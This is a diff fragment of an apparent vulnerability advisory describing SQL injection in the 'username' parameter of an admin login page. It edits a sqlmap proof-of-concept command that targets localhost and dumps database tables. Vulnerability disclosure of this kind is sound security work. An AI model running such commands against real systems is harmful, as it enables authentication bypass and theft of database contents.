@@ -15,7 +15,7 @@
 # Description
 + Inadequate validation and sanitization of the 'username' parameter pave the way for attackers to construct SQL injection queries, circumventing authentication measures and obtaining unauthorized entry to the database.
 # Proof of Concept (PoC) : 
-+ `sqlmap -u "http://localhost/msms/admin/index.php" --cookie="PHPSESSID=o890ubil0t0jmdo7qokqcl6tgr; Security_level=0" --data="username=admin&password=admin&login=Sign+In" -p"username" --random-agent --level 3 --risk 3 --dump --tables`
++ `sqlmap -u "http://localhost/msms/admin/index.php" --method POST --data="username=admin&password=admin&login=Sign+In" -p"username" --random-agent --level 3 --risk 3 --dump --tables`
 
 ```
 ---
